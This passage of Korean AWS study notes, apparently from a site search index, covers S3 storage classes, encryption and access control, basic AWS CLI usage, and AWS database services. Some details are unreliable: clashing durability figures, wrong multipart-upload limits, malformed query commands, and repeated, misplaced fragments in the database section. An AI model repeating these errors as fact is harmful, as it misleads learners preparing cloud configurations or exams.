보호할 수 있다.\n    서버 측 암호화  서버 측의 암오화는 S3 플랫폼 자체의 암호화를 의미하며, 데이터 객체를 암호화해서 적합한 인증으로 복호화하는 작업이 AWS에서 이루어진다. Amazon S3가 관리하는 암호화 키(SSE-S3)를 사용하면 AWS가 자체 엔터프라이즈 표준 키를 사용해 암호화 복호화 프로세스의 모든 단계를 관리한다. AWS KMS-관리형 키를 사용하는 서버 측 암호화(SSE-KMS)를 사용하면 SSE-S3가 제공하는 기능에 더해 완벽한 키 사용 추적과 봉투 키를 사용할 수 있다. 고객 제공 암호화 키에 의한 서버측 암호화(SSE-C)는 고객이 S3에 제공한 자체 키로 객체를 암호화 한다.      클라이언트 측 암호화  S3로 데이터를 전송하기 전에 암호화하는 것으로, AWS KMS-관리현 고객 마스터 키(KMS-CMK)를 사용하며, 업로드 전에 고유 키로 객체를 암호화한다. 복잡한 암호화 절차를 단순화하기 때문에 서버 측 암호화를 많이 사용하지만, 회사 내에서 암호화 키의 모든 권한을 가지고 있어야 하는 경우도 있을 때 주로 사용된다.      로깅   S3 이벤트 추적을 로그 파일에 저장하는 기능은 처음에는 비활성화 되어있다.\n  S3 버킷에서 일어나는 많은 활동을 로그 데이터로 만들어 기록할 필요 없기 때문이며, 로그파일을 기록하는 것을 이를 로깅이라한다.\n  로깅을 활성화 할 때는 원본 버컷과 대상 버킷을 지정해야 하며, 하나의 대상 버킷에 여러 원본 버킷 로그를 저장했을 때 쉽게 시벽할 수 있도록 구분 기호와 접두사를 사용한다.\n  S3는 CloudWatch나 CloudTrail와 같은 AWS 서비스 및 다른 서버들의 로그저장하는 데에도 사용된다.\n  S3 생성 로그는 구성화면, 잠시 후 다음과 같은 작업 상세 항목이 기본으로 나타난다.\n 요청자 게정과 IP 주소 원본 버킷 이름 요청 동작(GET, PUT) 요청 개시 시간 응답 상태 ( 오류 코드 포함 )         S3 내구성과 가용성   객체를 저장할 때 여러 S3 스토리지 클래스 중에서 선택할 수 있으며, 내구성, 가용성, 지출가능 비용에 따라 선택한다. 관련용어 설명     키워드 설명     내구성 데이터가 손실되지 않을 확률   가용성 객체가 사용 가능한 기간   지출가능 비용 사용시 지불해야하는 가격        내구성   내구성은 백분율로 측정되며, Amazon Glacier의 경우 99.999999999% 내구성을 보장하는 데 이는, 10.000.000개의 객체를 저장하면 1만 년 동안 객체가1개 손실될 확률을 의미한다.\n  즉 S3 Standard/Glacier 플랫폼에 저장한 데이터를 인프라 장애로 손실할 가능성은 거의 없다고 볼 수 있다.\n  S3는 최소 3개의 가용 영역에 데이터를 자동으로 복제하기 때문에, 높은 내구성을 보장할 수 있다.\n  하지만 복원력이 없는 두 클래스도 존재하는 데, Amazon S3 One Zone-IA(Infrequent Access)은 단일 가용 영역에만 저장하며, RRS(Reduced Redundancy Storage)는 다른 클래스보다 적은 영역에 복제하기 때문에 99.99% 내구성만을 보장한다.\n      S3 스토리지 안정성 보장 표준       S3 Standard S3 Standard-IA S3 One Zone-IA RRS     내구성보장 99.999999999% 99.999999999% 99.9999999999% 99.99%   내결함성을 위한 동시 복제 시설 수 2 2 1 1        가용성   객체 가용성도 백분율로 측정하며, 1년 동안 해당 객체를 요청했을 때 즉시 응답할 수 있는 기간을 백분율로 나타낸다.\n  만약 Amazon S3 Standard 클래스는 연간 99.99%의 가용성을 가지고 있는 데, 이는 1년 동안 중단 시간이 1시간 이내를 의미한다.\n        S3 스토리지 표준 가용성 보장       S3 Standard S3 Standard-IA S3 One Zone-IA RRS     가용성 보장 99.99% 99.9% 99.5% 99.99%      데이터의 최종 일관성  S3는 데이터를 여러 장소에 복제하므로, 기존 데이터가 업데이트되면 시스템에 전파하느 동안에 지연시간이 발생할 수 있다. 단 이는 객첼르 생성(PUT) 할 때에는 객체 버전이 충돌할 가능성이 없으므로, 쓰기 후 읽기 일관성이 제공된다.       객체 수명 주기    S3에서 시작하는 워크로드는 대개 백업 아카이브와 관련이 있다.\n  백업 아카이브는 주기적으로 저장되므로 이에 대한 관리가 필요한 데, S3버전 관리를 통해 해결이 가능하다\n    버전 관리  기본적으로 동일한 파일을 업로드 시키는 경우에는 덮어씌어지는 데, 이는 심각한 문제를 초래할 수 있다. S3도 이와 동일하게 작동하지만, 버킷 수준에서 버전 관리를 활성화하게 되면 이전 객첼르 보존할 수 있어, 기존 버전에 계속 엑세스 하는 것이 가능하다.      수명 주기 관리  버킷에서 수명 주기 규칙을 구성하면 지정한 기간이 경과했을 때 자동으로객체가 다른 스토리지 클래스로 옮겨진다. 예를 들면 첫 30일동안은 S3 Standard 클래스에서 보관되지만, 그 이후에는 보다 저렴한 One Zone IA으로 옮겨진다. 과거 버전을 지속저으로 유지해야하는 경우 장기 저장용 Storage 서비스 Glacier으로 365일 보관이 가능하다.       S3 객체 엑세스   S3에 데이터를 저장해서 사용하겠다고 결정했다면 중요성에 맞게 S3에 저장된 객체에 엑세스하는 방법과 업무의 보안상 필요에 맞는 요청만 엑세스하도록 제한하는 방법이 필요하다.      엑세스 제어  외부 사용자는 버킷의 객체에 엑세스가 불가능하지만, ACL (엑세스 제어 목록), S3 버킷 정책, IAM 정책을 통해서 버킷이나 객체 수준에서 접근이 가능토록 할 수 있다. 위와 같은 ACL, S3 버킷 정책, IAM은 일부 중복되어 있으며, 이는 점차 서비스가 발전해오면서 새로운 기능이 추가된 서비스가 생성되었기 때문이다. 현재는 ACL대신 S3 버킷 정책이나 IAM을 사용하길 권장하고 있다. S3 버킷 정책 (JSON 형식으로 S3 버킷에 연결)은 외부 계정과 사용자가 S3 버킷에 엑세스하는 것을 제어할 수 있는 반면, IAM 정책은 IAM이 관리하느 계정, 즉 사용자와 역할이 S3를 비롯한 여러 리소스에 엑세스하는 방식을 제어하고자 할 때 사용된다.        미리 서명된 URL  외부 엑세스가 제한된 프라이빗 객체에 임시로 엑세스할 수 있게 할 때, 미리 서명된 URL을 사용할 수 있다. 미리 서명된 URL은 시간 제한이 존재하며, 기간이 지나면 사용이 불가능해지며 프로그래밍 방식으로 객체에 엑세스가 가능하다.    $ aws s3 presign s3://[ MybucketName ] /[ FilePath ] --expires-in [ second ]\r# second 만큼의 초 시간의 특정 File의 엑세스를 허용하는 CLI 명령어\r   정적 웹 사이트 호스팅   S3 버킷은 정적 웹 사이트 HTML 파일 호스팅에도 사용 정적 웹 사이트는 웹 페이지와 스크립트를 랜더링할 때 서버가 아닌 클라이언트 시스템 서비스를 사용  $ aws s3api put-bucket-acl --bucket [ MybucketName ] --acl Public-read\r# 버킷의 호스팅 설정을 추가하는 CLI 명령어\r$ aws s3 website s3://[ MybucketName ] --index-document index.html --error-document error.html\r$ 버킷의 정적 웹 사이트를 호스팅하며 메인 페이지와 에러 페이지를 설정한다. ( 수정 가능 )\r    S3 Select와 Glacier Select  AWS는 S3나 Glacier에 저장한 데이터에 엑세스할 수 있는 또 다른 방법을 제공하는 데, 이를 Select이라 한다. 이를 사용하면 SQL와 유사한 쿼리로 저장된 객체에서 관련 데이터만 검색하는 것이 가능ㅎ다ㅏ.       Amazon Glacier   Glcanier는 S3 스토리지 클래스의 일부로 Glacier는 대부분 S3 클래스와 마찬가지로 99.999999999% 내구성을 보장하고, S3 구셩 주기에 통합할 수 있다. 단 S3와 다른 점은 S3는 단일 객체 최대 크기가 5TB인 반면, Glacier은 40TB까지의 대형 아카이브를 지원하고, S3에서는 암호화를 선택해야하지만, Glacier는 인간이 읽을 수 없는 ID가 주어진다. Glacier의 단점은 데이터를 가져오는 데 걸리는 시간으로 S3는 즉시 엑세스가 가능하지만, Glacier 아카이브에서 객체를 가져오려면 몇 시간이 걸릴 수도 있다. 이와 같이 Glacier의 목적은 데이터의 필요성과 사용빈도가 낮은 한경에서 장기적으로 데이터를 보관할 수 있는 저렴한 스토리지로 사용할 수 있다는 것이다.     스토리지 요금   스토리지 요금은 버전 관리와 객체 수명주기로 계속해서 파일이 이동하므로 과정이 복잡하다 할 수 있다. 서울 리전 스토리지 요금 예시     클래스 스토리지 용량 요금/GB/월 비용/ 월     Standard 20G $0.018 $0.36   Standard 65G $0.0144 $0.938   Standard 520G $0.005 $2.6   합계     $3.398     이 외에도 트래픽 관련 요금이 부과되며 기타 모든 요금에 대한 정보는 여기에서 확인할 수 있다. AWS 월 사용량 계산기     기타 스토리지 관련 서비스   AWS에는 S3, Glacier 이외에도 다양한 Storage Service 있다.    Amazon Elastic File System ( EFS )  EFS자동 확장 가능한 공유 파일 스토리지 서비스. 동일 VPC 내의 Network File System ( NFS )으로 여러 EC2 인스턴스에 장착한다. AWS Direct Connect 연결로 온프레미스 서버에서 엑세스할 수 있도록 설계되어 있다.        AWS Storage Gateway  온 프레미스의 로컬 백업과 아카이브 운영 요구 사항을 클라우드 스토리지 서비스를 사용해 해결하려면 복잡하진다. AWS Storage Gateway는 소프트웨어 형식의 게이트웨이로 VMware, EC2 ,Hyper-V 와 등에 사용하면 보다 쉽게 S3, EBS로 데이터의 이전이 가능하다.        AWS Snowball  대용량 데이터 세트를 일반 인터넷 연결로 클라우드에 마이그레이션하려면 많은 시간과 대역폭이 필요로 한다. 테라 혹은 페타바이트 크기의 데이터를 옮길 때문 AWS에서 256비트로 암호화한 물리적 장치인 Snowball을 사용자에게 배송하며, 이를 AWS다시 수거해 S3에 올려준다.       요약    Amazon S3는 적은 유지 관리 노력으로 대용량 아키이브와 데이터 스토리지를 운영할 수 있도록 안정성과 고가용성을 갖춘 객체 스토리지를 제공한다.\n  객체는 게층화 돼 있지 않은 버킷에 저장되어 있지만, 접두사를 사용해서 일반 파일 시스템에 있는 것처럼 보일 수 있다.\n  AWS가 제공하는 암호화 키 또는 자체 암호화 키를 사용해 S3 자체 데이터를 암호화 할 수 있으며, 대개 필수로 데이터를 암호화한다.\n  암호화의 종류로는 서버 측 암호화, 클라이언트 측 암호화로 저장 중 암호화가 이루어진다.\n  S3는 데이터 복제 정도가 다른 여러 스토리지 클래스를 제공해서 사용자가 내구성, 가용성, 비용을 고려해서 선택할 수 있게 한다.\n  기존 ACL, S3 버킷 정책, IAM을 통해 보안 주체, 대상, 시간을 제어할 수 있다. 일시적으로 제한된 데이터 엑세스를 제공하는 안전한 방법으로는 미리 서명된 URL을 사용한다.\n  SQL과 유사한 S3 Select와 Glacier Select를 사용하면 데이터 요청 크기와 비용을 줄일 수 있으며, S3 버킷에 저렴하고 간단한 정적 웹 사이트를 만들 수도 있다.\n  Amazon Claier은 데이터 아카이브를 볼트에 저장하고 가져올 때는 몇 시간이 걸리지만, S3 스토리지 클래스보다 비용이 저렴하다.\n     시험 핵심   S3 리소스 구성되는 방식을 이해한다.  S3 객체는 버킷에 저장되는 데, 버킷 이름은 글로벌하게 고유해야 하며, 버킷은 Region과 연결된다. 객체는 구조화되지 않은 버킷에 저장되지만 접두사와 기호를 사용해서 데이터에 폴더 게층 구조를 나타낼 수 있다.      데이터 전송을 최적화하는 방법을 이해한다.  S3 버킷에 저정하는 개별 객체의 크기는 5TB이며, 100MB보다 큰 객체는 멀티 파트 업로드를 사용해야 한다. 5TB보다 큰 객체는 멀티 파트 업로드 이외의 다른 업로드 방법이 없다.      S3 데이터 보안 방법을 이해한다.  AWS에서 생성한 키 또는 비공개 키로 서버 측 암호화를 사용하면 S3 버킷 내에서 데이터를 보호할 수 있다. 클라이언트 측 암호화를 사용해 S3 전송되기 전에도 데이터를 암호화 할 수 있다.      S3 객체의 내구성과 가용성을 측정하는 방법을 이해한다.  다양한 S3 클래스와 Glacier는 여러 수준에서 인프라 안정성과 데이터 가용성을 약속한다.      S3 객체 버전 관리와 수명 주기 관리를 이해한다.  객체를 덮어 쓴 뒤에도 덮어쓰기 전 객체를 보존해서 액세스 할 수 있다. 지연 시간이 짧은 스토리지 클래스에 지연 시간이 긴 클래스로 자동 전환하는 방법은 오래된 객체를 관리할 수 있고, 최종적으로 삭제 예약 또한 가능하다.      S3 객체를 보호하는 방법을 이해한다.  기존 버킷과 객체 기반 ACL 규칙으로 엑세스를 제어할 수 있고, 더욱 유연한 S3 버킷 정책이나 곚어 수준 IAM 정책으로 엑세스를 제어할 수 있다. 미리 서명된 URL를 통해 임시로 엑세스를 허용할 수 있다.      정적 웹 사이트를 만드는 방법을 이해한다.  S3에 HTML, 미디어 파일을 저장하고 Route 53과 CloudFront를 사용해서 DNS 도메인 이름으로 액세스 할 수 있는 암호화된 HTTPS 페이지 웹사이트로 제공할 수 있다.      S3와 Glacier의 차이를 이해한다.  Glacier는 자주 요청되지 않으리라고 예상하는 데이터 아카이브를 위한 저렴한 장기 보존 스토리지이다.    "});index.add({'id':44,'href':'/docs/cloudcomputing/awstraining/cli/','title':"AWS CLI 활용",'content':"AWS CLI 활용    AWS CLI 활용    이번 시간에는 AWS CLI을 활용하는 방법에 대해 알아보도록 하겠습니다. AWS CLI의 대한 개념과 설치는 AWS CLI를 참고해주세요.     AWS CLI 기본설정   먼저 여기서는 Window 10, Powershell에서 진행하도록 하겠습니다. Linux나 Mac 등 타 OS도 AWS CLI가 설치되어 있으면 모두 동일하니 똑같이 진행하셔도 문제없습니다.      먼저 프롬프트 혹은 터미널을 실행 후, aws configure을 입력합니다. 그러면 엑세스 키와 시크릿 키, 리전 그리고 파일형식을 입력하는 값이 나오는 데, 만약 전 시간에서 사용자 계정을 만들면서 학습했던 프로그래밍 엑세스 방식이 생각나신다면, 한결 수월하게 해결하실 수 있습니다. 혹시 모르시거나 깜박하신 분들은 AWS IAM, AWS 사용자 계정 생성을 참고해주세요.   $ aws configure\r# aws 인증 값 등록\rAWS Access Key ID [ AcceseeKeyId ]: *********\r# 계정의 AccessKeyId를 입력\rAWS Secret Access Key [ SecretAccessKey ]: ********\r# 계정의 SecretAccesskey를 입력\rDefault region name [ Region ]: ap-northeast-2\r# 리전의 이름을 입력\rDefault output format [ File format ]: json\r# 파일의 포맷 형식을 입력\r$ aws ec2 describe-security-groups\r# 확인 ( 차후에 명령어에 대해 설명드리겠습니다. )\r   AWS CLI 사용방법    그럼 이제 본격적인 CLI 사용방법에 대해 알아보도록 하겠습니다.   profile을 설정   위에서 configure을 통해 aws CLI을 사용하기 위한 인증을 마쳤습니다. 하지만 만약 인증을 마친 유저에 대한 권한이 다르다면, 또 다른 계정을 사용해야 한다면 어떻게 해야할까요? 이를 위해 AWS CLI에서는 \u0026ndash;profile 명령어를 통해 별도이 설정파일로 저장할 수 있습니다.   $ aws configure --profile [ User ]\rAWS Access Key ID ... : ***\r...\rDefault output format ... : ***\r# 개별 설정파일 등록\r$ aws [ 명령어 ] --profile [ User ]\r$ [ User ]의 권한으로 명령어를 실행\r 위의 명령어를 통해 [ User ]의 profile을 지정 후 저장 후, \u0026ndash;profile [ User ] 옵션을 통해 사용합니다. 등록한 모든 설정파일은 보통 사용자계정 폴더 내부의 .aws에 생성됩니다.     AWS CLI 기본적인 명령어 형태   AWS CLI의 기본적인 명령어 형태는 다음과 같습니다.  $ aws [ 서비스 이름 ] [ 리소스 조작 명령어 ]\r-------------------------------------------------------------------------------------------------\r옵션 | 처리 -------------------------------------------------------------------------------------------------\r--profile | 설정한 profile로 명령어를 실행합니다.\r--region | 리전을 지정합니다.\r--output | 출력 형식을 지정합니다.\r--filters | 참조 계열 명령어를 사용할 때, 검색 조건을 지정해서 필터링 합니다.\r--query | 실행 결과 내용을 압축해서 출력합니다.\r   Region과 output 옵션을 사용한 검색 조건 지정 $ aws ec2 describe-security-groups --region ap-northeast-2 --output [ json, text, table ]\r# ap-northeast-2 리전에서 각 형식으로 ec2 보안그룹에 대한 정보를 참조\r 각 형식의 차이점을 확인해보세요.     filters 옵션을 사용한 검색 조건 지정   \u0026ndash;filters 옵션을 사용하면 참조 계열 명령어를 실행할 때, 검색 조건을 지정할 수 있습니다. 지정할 수 있는 \u0026ndash;filters 옵션의 필터 이름은 서비스, 리소스에 따라 차이가 있어 AWS CLI 명령어 레퍼런스를 참고해주세요..   $ aws [ 서비스 이름 ] [ 리소스 조작 명령어 ] --filters \u0026#34;Name=[ 필터 이름 A ], Values=[ 조건A1 ]\u0026#34; \u0026#34;Name=[ 필터 이름 B ], Values=[ 조건B1 ], [ 조건B2 ]\u0026#34;\r 위와 같이 \u0026ndash;filters의 사용방법은 1개의 필터에 큰 따옴표(\u0026quot;)를 감싸고, \u0026ldquo;Name=\u0026quot;에 필터이름, \u0026ldquo;Values=\u0026quot;에 필터 이름에 대응하는 조건을 작성하는 것으로, 쉼표(,)를 통해 복수의 조건을 작성하는 것 또한 가능합니다.   $ aws ec2 describe-instances --filters \u0026#34;Name=private-ip-address,Values=10.0.0.10\u0026#34;\r# 프라이빗 ip가 10.0.0.10인 ec2를 참조\r$ aws ec2 describe-instances --filters \u0026#34;Name=instance-type,Values=t2.medium, m3.medium\u0026#34;\r# 인스턴스의 타입이 t2.medium, m3.medium인 인스턴스를 참조\r$ ec2 describe-instances --filters \u0026#34;Name=tag:Project,Values=AWS Training\u0026#34;\r# 태그의 값이 AWS Training인 인스턴스를 참조\r$ aws ec2 describe-instances --filters \u0026#34;Name=instance-type,Values=t2.medium, m3.medium\u0026#34; \u0026#34;Name=tag:Project,Values=AWS Training\u0026#34;\r# 2번째 조건과 3번째 조건을 함께 사용하는 인스턴스 참조\r$ aws ec2 describe-images --filters \u0026#34;Name,Values=SampleAMI2020*\u0026#34;\r# AMI images 중에서 이름이 SampleAMI로 시작하는 모든 인스턴스를 참조\r   query 옵션을 사용한 출력 결과 압축   query 옵션을 사용해서 명령어를 실행 할 때 실행 결과를 압축할 수 있습니다. filters와 마찬가지로 각 서비스에 따라 사용할 수 있는 query가 다르며 가능한 명령어들은 AWS CLI 명령어 레퍼런스를 참고해주세요.   $ aws [ 서비스 이름 ] [ 리소스 조작 명령어 ] --query \u0026#39;[ 쿼리 이름 ( 1계층 )[].쿼리 이름(2 계층)....\u0026#39;]\r query는 계층 구조로 되어 있습니다. 따라서 AWS CLI 명령어 레퍼런스를 참고해서 계층 구조와 출력할 항목을 query 옵션으로 지정해야 합니다. query은 추가로 json, table 형식으로 출력할 때는 쿼리 이름이 키 ( 별칭 )을 붙여야 하며, \u0026ndash;filter와 마찬가지로 조건을 지정할 수 있습니다. ( \u0026lt;, \u0026lt;=, ==, \u0026gt;=, \u0026gt;, !=)   $ aws ec2 describe-instances --query \u0026#39;Reservations[].Instances[].InstanceId\u0026#39;\r# 모든 인스턴스의 인스턴스 ID를 참조\r$ aws ec2 describe-instances --query \u0026#39;Reservations[].Instances[].[InstanceId,PrivateIpAddress]\u0026#39;\r# 모든 인스턴스의 인스턴스 ID, 프라이빗 IP를 참조하는 방법\r$ aws ec2 describe-instances --query \u0026#39;Reservations[].Instances[?InstanceType=\u0026#39;t2.small\u0026#39;].[InstanceId, PrivateIpAddress] --output json\r# 인스턴스 유형이 t2.small인 것의 인스턴스 ID, 프라이빗 IP를 json형식으로 출력\r$aws ec2 describe-instances --query \u0026#39;Reservations[]. Instances[?InstanceType==\u0026#39;t2.small\u0026#39;].{IDLInstanceID,IP:PrivateIpAddress,Name:Tags[?Key==\u0026#39;Name\u0026#39;].Value}\u0026#39; --output json\r# 인스턴스 유형이 t2.small인 것의 인스턴스 ID, 프라이빗 ID에 ID, IP라는 키를 붙여 JSON 형식으로 출력하는 방법\r  지금까지 기본적인 AWS CLI에 명령어에 대해 알아보았습니다. 하지만 아직, 인스턴스나 VPC, 각종 서비스에 대해 공부를 하지 않아 아직까지는 간단하게 어떻게 작동되는 지, 어떠한 형식을 가지고 있는 지만 익혀두시면 충분합니다.  "});index.add({'id':45,'href':'/docs/cloudcomputing/amazonwebservice/aws_database/','title':"AWS Database",'content':"AWS DataBase   Amazon RDS ( Relational Database Service )  분산 관계형 데이터베이스 MariaDB, MySQL, PostgreSQL, Oracle 등을 AWS에서 제공해주는 것 애플리케이션 내에서 관계형 데이터베이스의 설정, 운영, 스케일링을 단순케 하도록 설계된 클라우드 내에서 동작하는 웹 서비스 데이터베이스 소프트웨어 패치하거나 데이터베이스를 백업하거나 시점 복구를 활성화하는 것과 같은 복잡한 관리 프로세스들은 자동으로 관리 스토리지와 연산 자원들을 스케일링 하는 것은 하나의 API 호출로 수행이 가능 관계형 데이터베이스를 AWS 상에서 사용할 수 있도록 지원하는 서비스 생성 후 서비스를 이용하기만 되므로 SaaS에 해당 MySQL, MariaDB, Postgre SQL, Oracle, MS SQL, Aurora 사용 가능 DB 인스턴스에 대한 shell 지원 불가 및 OS 제어 불가능 ( AWS 관리 ) 백업, 소프트웨어 패치, 장애 감지 및 복구를 AWS가 관리 Storage 용량에 대하여 Auto Scaling MariaDB, MySQL, Aurora는 서로 호환이 가능    DB Instance  RDS의 기본 구성요소로서 클라우드에서 실행하는 격리된 데이터베이스 환경을 의미, 인스턴스 내에서는 여러 사용자가 만든 데이터베이스가 포함되며 엑세스할 여러 도구와 앱 사용 가능 DB 인스턴스도 EC2처럼 다양한 클래스를 가지고 있음 ( db.m5, db.r5 등 ) RDS도 클라우드에서 실행되기 때문에 하나의 AZ에서 격리되어 인스턴스로서 실행   DB Instance Storage  데이터베이스의 유지를 위패 EBS를 사용하며 필요한 스토리지 용량에 맞춰 자동으로 데이터를 여러 EBS 볼륨에 나누어 저장 스토리지의 유형 범용 SSD: 대부분의 워크로드에서 사용하는 기본적인 스토리지 프로비져닝 IOPS: 빠르고 일관적인 I/O 성능이 필요하고 일관적으로 낮은 지연시간이 요구될 경우 사용하는 스토리지 ( I/O input/ Output ) 마그네틱: 접속 빈도가 적은 워크로드에 적합한 스토리지   Multi-AZ  RDS는 Multi-AZ라는 기능을 통해 고가용성을 지원 ( 다수의 AZ에 DB 인스턴스를 둠으로써 하나 혹은 그 이상의 AZ가 파괴되어 서브시가 불가능 할 때를 대비 ) 기본 인스턴스가 수행해야할 작업( 백업, 스냅샷 생성 ) 등을 대신하여 수행함으로서 기본 인스턴스의 부담을 줄임 RDS도 클라우드에서 실행되기 때문에 하나의 AZ에서 격리되어 인스턴스로서 실행 기본 인스턴스에서 스냅샷을 캡쳐한 후 다른 AZ에 복원하여 ‘동기식’ 예비 복제본을 생성 Active( AZ A )-Standby ( AZ B, C ) 구조를 형셩한 후 지속적으로 동기화 ‘ 예비 ‘ 복제본이기 때문에 읽기 및 쓰기 작업을 수행할 수 없음 Multi-AZ를 사용하는 경우, 단일 AZ 배포에 비해 쓰기 및 저장 지연 시간이 길어질 수 있음 ( 동기화 문제 )   Multi-AZ  Multi-AZ를 활성화한 상태에서 DB 인스턴스에 문제가 발생하면 자동으로 다른 AZ의 예비 복제본 ( Standby )로 전환하며 서비스를 이어나감 전환에 사용되는 시간은 60- 120초 전환되는 상황 가용 영역( AZ ) 중단 기본 DB 인스턴스 오류 DB 인스턴스 서버 유형 변경 기본 DB 인스턴스 OS에서 소프트웨어 패치 실시 장애 조치 재부팅( Failover ) 실시  DB Instance Storage  데이터베이스의 유지를 위패 EBS를 사용하며 필요한 스토리지 용량에 맞춰 자동으로 데이터를 여러 EBS 볼륨에 나누어 저장  Read Replica  읽기 전용의 복제본, 기본 DB 인스턴스가 읽기와 쓰기를 담당한다면 Read Replica는 읽기 작업만을 담당하여 마스터 DB 인스턴스의 부하를 줄임 우선 DB 마그네틱: 접속 빈도가 적은 워크로드에 적합한 스토리지   Automated Backup  RDS의 자동백업으로 개별 데이터베이스를 백업하는 것이 아닌 DB 인스턴스 전체를 백업하는 것 매일매일 백업이 이루어지며, 기본 보존기간은 CLI로 생성시 1일\u0026amp; 콘솔로 생성시 7일이며 최저 1일부터 35일 까지 가능 특정시점을 지정하여 복원가능하며 복원 기간내로부터 최근 5분까지 특정시점을 지정하여 복원 가능 사용자가 백업시간에 자동적으로 백업되며, 백업 중에는 스토리지 I/O가 일시적으로 중단될 수 있음 ( Multi-AZ 사용시 Standby에서 백업 실시 ) 전환되는 상황 가용 영역( AZ ) 중단 기본 DB 인스턴스 오류 DB 인스턴스 서버 유형 변경 기본 DB 인스턴스 OS에서 소프트웨어 패치 실시 장애 조치 재부팅( Failover ) 실시   Enhanced Monitoring  RDS의 지표를 실시간으로 모니터링하는 ‘ 강화된＇ 모니터링 모니터링 지표는 CloudWatchs Logs에 30일간 저장됨 일반 모니터링과의 차이점은 Enhanced Monitoring은 인스턴스 내 에이전트를 통해 지표를 수집하는 반면, 일반 모니터링은 하이퍼바이저에서 수집 ( 최대 1초 단위 )   RDS vs DB in EC2  EC2 위에 데이터베이스를 직접 올리는 만큼 설정을 마음대로 변경할 수 있고, 커스터마이징 또한 가능 RDS와는 반대로 백업과 패치 등 관리를 직접해야 함 EC2에 설치하는 것이기에 SSH 접속 가능    Amazon DynamoDB  종합 관리형 NoSQL 데이터베이스 서비스로, 원할환 확장성과 예측 가능한 성능을 제공 데이터 규모에 관계없이 데이터를 저장 및 검색하고, 어떤 수준의 요청 트래픽이라도 처리할 수 있는 데이터베이스 테이블의 생성이 가능 배포가 단순하고 신속, 설계를 해서 데이터베이스의 적용까지 많은 시간이 소요되지 않음 확장이 단순하고 신속, 단순한 인터페이스의 유리 온 디맨드 백업기능 제공   DynamoDB의 특징  배포가 단순하고 신속 확장이 단순하고 신속, 수백만 IOPS 데이터는 자동으로 복제되어 있음 빠르고 일관된 응답시간, SSD, 10밀리초 미만 보조 인덱스를 통한 빠른 조회 사용한만큼 지불, 저장소 및 프로비저닝된 처리용량    Amazon ElastiCache   Cache  Cache는 CPU 칩 안에 들어가 있는 작은 메모리 ( 물리적 실체 ) 프로세서가 필요한 데이터가 있을 때마다 메인 메모리에 일일이 접근하여 속도가 지연되는 것을 막기 위해 자주 사용하는 데이터를 담아두는 곳 즉 처리 속도 향상을 위해 존재하는 작은 칩이자 메모리 L1,L2,L3로 나뉘며 숫자가 적을 수록 도달하는 속도가 빠름 Cache는 CPU와 메모리 사이 뿐만 아니라, 메모리와 디스크 사이에서도 발생함 후술할 In Memory Cache는 메모리와 디스크 사이의 Caching을 의미   In Memory Cache ( In Memory DataBase )  데이터 처리 속도를 향상시키기 위한 메모리 기반의 DBMS 메모리 위에 모든 데이터를 올려두고 사용하는 데이터베이스의 일종( ElastiCache가 AWS 카테고리에서 DB 부분에 있는 이유 ) 디스크에 최적화된 Database ( RDS 등 ) 에서 저장된 쿼리 결과나 자주 사용하는 데이터를 메모리에 적재하여 사용하는 것은 비효율적 즉 모든 데이터를 메모리 위에 올려두어 굳이 디스크 기반의 데이터베이스에까지 이동하여 데이터를 가져와 속도가 저하되는 것을 막음 데이터베이스의 데이터뿐만 아니라, 디스크, 세션, 기타 동적으로 생성된 데이터를 저장할 수 있음 메모리 기반의 데이터베이스이기 때문에, 휘발성 메모리라는 단점이 존재하며 전원 공급 차단시 모든 데이터가 유실되고 할당된 메모리에 한해 저장 가능   ElastiCache  AWS의 In Memory Cache Service Memcached와 Redis로 나뉨 Memached, Redis 모두 비관계데이터베이스형(NosQL) 서비스이며, Key-value 기반임 Memached, Redis 모두 이미 존재하는 서비스이며 AWS에서 사용가능하도록 구현한 것 ElastiCache는 Node로 구성되어 서비스를 제공하며, Node는 EC2처럼 다양한 Type을 가지고 유형에 따라 다양한 메모리 크기를 가짐 다양한 Type을 갖는 이유는 적은 양의 메모리가 필요할 경우, 작은 Type의 Node를 사용하여 비용을 적게 들게 하기 위함 유형이 결정된 Node들은 ‘고정된’ 메모리 크기를 가지며, 각자의 DNS로 이루어진 엔드포인트를 보유함   Memcache  Cluster로 구성되어 있으며, Cluster 내에는 Node들이 존재하여 인 메모리 캐시로서의 역할을 담당함 각 Node는 Type별로 메모리를 보유하며 서비스를 제공하며, 필요시 Node를 늘려 서비스 용량을 향상시킬 수 있음 각 Node별로 AZ를 따로 둘 수 있지만, 장애 조치(Failover)가 불가능하고 복제본을 둘 수 없음 Redis의 특징 기본적으로 Cluster로 구성되지는 않지만, Cluster로 구성이 가능하며 Shard와 Node를 가지고 있음 Shard는 여러 Node로 구성되며, 하나의 Node가 읽기/쓰기를 담당하고 나머지 Node는 복제본 역할을 함 Cluster로 구성되지 않은 Redis는 하나의 Shard만을 가지지만, Cluster로 구성될 경우 다수의 Shard를 갖게 됨 복제본을 가지므로, 장애조치(복제본을 기본 Node로 승격)가 가능하며 Multi-AZ 기능을 지원함    Amazon Redshift   Redshift  PostgreSQL를 기반으로 하는 AWS의 Data Warehouse Service 모든 데이터를 표준 SQL 혹은 BI 도구를 사용하여 효율적으로 분석할 수 있도록 지원 대량 병렬처리(MPP)를 통해 복잡한 쿼리라도 빠른 속도로 실행하여 대용량 처리 가능 열(Column) 단위 데이터 저장방식 COPY 명령어를 통해 Amazon EMR, Amazon DynamoDB, S3로부터 데이터를 병렬 로드 가능 Enhanced VPC Routing을 통해 클러스터와 VPC 외부의 COPY, UNLOAD 트래픽을 모니터링할 수 있음 WLM(Workload Management)를 통해 사용자가 작업 부하 내 우선 순위를 유연하게 관리하도록 지원 보존기간이 1일인 자동 백업을 지원하며, 최대 35일까지 설정 가능 단일 AZ 배포만을 지원함   Redshift의 구성  클러스터 : Redshift의 핵심 요소로, 하나의 리더 노드와 다수의 컴퓨팅 노드를 가지고 있는 구성 요소 리더 노드 : 클라이언트 프로그램과 일어나는 통신을 비롯해 컴퓨팅 노드간의 모든 통신/작업 관리 컴퓨팅 노드 : 실제 작업을 수행하는 노드로, 각 노드마다 전용 CPU와 메모리 내장 디스크 스토리지를 따로 보유함   Data Warehouse(DW)  하나의 통합된 데이터 저장공간으로서, 다양한 운영 환경의 시스템들로부터 데이터를 추출, 변환, 통합해서 요약한 데이터베이스 데이터베이스가 관련 있는 업무 데이터는 잘 저장하나, 저장된 데이터들을 제대로 활용하지 못 하는 것에서 착안 기본적으로 관계형 데이터베이스가 있는 상태를 가정하여 DW를 구성하며, 동영상이나 음악처럼 DB에 저장할 수 없는 파일도 필요한 부분을 추출하여 보여주어야 함   